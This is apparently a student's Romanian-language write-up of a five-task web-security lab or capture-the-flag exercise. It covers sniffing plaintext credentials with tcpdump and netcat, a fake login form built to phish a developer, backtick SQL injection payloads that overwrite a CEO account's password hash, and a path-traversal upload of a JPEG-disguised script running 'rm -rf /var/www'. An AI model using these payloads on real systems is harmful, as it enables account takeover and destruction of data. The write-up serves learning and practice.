Task 1

Am dat tcpdump si am vazut pe acolo o adresa care se termina in .39.
De restul adresei ip nu prea imi pasa ca oricum se ocupa scriptul
de introducerea primilor 3 octeti din adresa ip. Cum e server web,
m-am gandit ca port-ul pe care il foloseste trebuie sa fie 80.

Asa ca pentru a rula tunelul folosesc ./webtunnel.sh 39 80

Task 2

Am rulat serverul in background(&) si am dat tcpdump si m-am uitat
la ce port-uri comunica. Am incercat sa ascult din ele aleator cu netcat
pana la unul din ele (8160) am vazut asta intr-un mesaj: 
username=maintenance&password=53c9f3e69a. Am introdus credentialele
(recunosc ca mi-a luat vreo 10 minute pana sa imi dau seama ca trebuie
sa dau check la checkbox).

Era acolo o imagine cu salam(parca zicea in postare ca acolo e flag-ul sau ceva).
Am salvat imaginea si am deschis-o cu bless si am gasit flag-ul acolo.

Task 3

Am creat un form care sa arate ca cel de pe pagina de login si am bagat un
script care ia valorile de username si password, le pune in textarea-ul in
care se scriu mesaje si apasa pe butonul de Send(dau click pe button[1] pentru
ca button[0] e butonul de submit din form). Teoretic ar trebui ca developer-ul
sa imi dea mesajul cu username-ul si parola. In practica vedeam in stanga jos
cum serverul tot incerca sa proceseze ceva, era in ceva loop si cred ca developer-ul
tot dadea submit in continuu, dar din anumite motive nu reusea sa se trimita nimic in
chat.

Cum am vazut ca dadea multe request-uri m-am gandit ca foarte probabil sa le vad
daca le interceptez cu tcpdump. Si da, am vazut acolo intr-un mesaj username-ul
si parola: username=t3hdev&password=6eed8c4ade.

Task 4

M-am uitat la tabela de accounts si am vazut parolele criptate. Am luat parola in clar
la unul din conturile pe care le stiam(dev cred) si l-am bagat pe site-ul de mai jos.
https://dnschecker.org/password-encryption-utility.php

Am vazut ca sunt criptate folosind SHA1, asa ca am bagat pe site eltonjohn
si am primit parola 4245d7f855340d0e1d713ec5ce0fabc90620bcb7 pe care aveam de gand
sa o inlocuiesc contului de CEO.

Am descoperit ca daca incercam sa selectez contul cu id-ul 1 imi dadea mesaj ca
e contul CEO-ului si nu il puteam vedea. Apoi am incercat sa caut punctul de injectie
cu cele 3 ghilimele(', ", `). In comanda nu mergea(si nici n-avea sens sa mearga),
nici la accounts nu mergea. Mergea insa cu backtick la numele de coloana din conditii,
dar nu si la valoare(ceea ce ma asteptam ca am citit pe TEAMS ca e escapata corect).
Asa ca trebuia sigur sa fac injectia la numele de coloana. Am vazut ca la un singur
` imi dadea ceva eroare si vedeam in eroare 'id > 1`', asa ca trebuia cumva sa fac sa scap de conditia aia.
Dupa incercari repetate(unele cu comentarii care nu voiau sa mearga) am ajuns la comanda
de mai jos
select, accounts, id` < 2 OR `fullname

Ce imi dadusem seama era ca query-ul SQL avea numele de coloana intre backticks, asa
ca trebuia sa inchid backtick-ul de la inceput si cel de la final, primul il folosesc
pentru conditia care ma interesa(id < 2 => ia doar id-ul 1) apoi am un OR ca voiam sa
fie alegerea ca conditia asta sa fie luata in considerare. Apoi pusesem un ` sa inchid,
imi dadea ceva eroare ca nu exista coloana "" asa ca am pus un nume de coloana acolo(fullname).
Motivul pentru care cred eu ca merge(nu sunt sigur) este ca SQL testeaza pana gaseste prima
conditie adevarata dintr-un sir OR pentru fiecare entry, motiv pentru care n-a ajuns sa se planga
ca nu i-am dat valoare la coloana fullname(desi poate se plangea la celelalte entry-uri, eh whatever).

Am vazut ca merge sa dau select, asa ca am dat update cu aceeasi injectie si parola de mai sus
update, accounts, password=4245d7f855340d0e1d713ec5ce0fabc90620bcb7, id` < 2 OR `fullname

Am descoperit in consola si credentialele username=musk3l00n13&password=1fb46e939a

Task 5

I-am dat mesaj la covert sa ma ajute. Mi-a dat mesajele de mai jos:

```
Apparently, the boss has a admin interface able to execute [somewhat limited] scripts.
Check if you can discover and do something with it ;) Come again in 5 minutes, I'll see if I can find more...
Okay, here's is a new one I heard from a fellow programmer: path traversal!
You still need to find a way to upload your own scripts somewhere on the server...If you need me again, ping me in 5 minutes!
Someone told me he managed to upload images containing valid scripts... check it out!
```

Din path traversal din cautari pe net am aflat ca se referea la un dot dot slash attack.
Am vazut ca pe directoare si chestii care exista dadea eroarea 126(nu stia ce sa faca cu ele).
Asa ca puteam sa imi dau seama daca un director sau fisier e intr-un anume director.
Am descoperit /var/www/images si credeam initial ca acolo sunt imagini si nu stiam de ce nu imi
gasea scripturile acolo. Apoi in inspect la network la imagini vedeam ca le primeste de la
/useruploads/posts/ de pe server, am testat si am vazut ca exista directorul posts.

Scriptul dupa diverse incercari l-am facut un fisier .sh(revenge.sh) in care scriam:

```
#!/bin/bash

rm -rf /var/www
```

Si am dat bless si am bagat la inceput magic number-ul la jpeg (FF D8 FF). Din rulari pe local
cu alte comenzi(ls) am observat ca merge rulat si asa scriptul si partea buna e ca daca dadeam file
pe el imi arata ca e JPEG. L-am urcat pe site din Home si am incercat sa-l rulez. Am vazut ca nu
mergea, cum ./file_permissions.sh mergea ma gandeam ca n-aveam destule permisiuni. Asa ca varianta
la care am ajuns a fost sa gasesc /bin/sh cu path traversal si sa il folosesc sa rulez scriptul.
Am ajuns la shellcode-ul de mai jos:

../../../bin/sh /var/www/userupload/posts/revenge.sh